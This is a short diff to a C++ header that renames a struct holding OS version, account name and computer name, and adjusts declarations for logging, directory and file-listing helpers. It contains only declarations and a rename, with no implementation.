@@ -10,7 +10,7 @@
 #include "helper.h"
 #include "encrypt.h"
 
-struct BlxrInfo {
+struct ClientInfo {
   OSVERSIONINFOEX osVersionInfo{};
   char *accountName{};
   char *computerName{};
@@ -18,7 +18,6 @@ struct BlxrInfo {
 
 };
 
-BlxrInfo *info;
 
 namespace Stream {
 class LogFile {
@@ -38,7 +37,7 @@ std::string GetPath(const std::string &dir = "");
 bool MakeDir(const std::string &path);
 bool MakeFile();
 bool WriteLog(const std::string &input, uint32_t &active, bool blockProcessInfo = false);
-void GetAccountInfo(BlxrInfo *data);
+void GetAccountInfo(ClientInfo *data);
 std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);
 
 static Stream::LogFile *logFile;
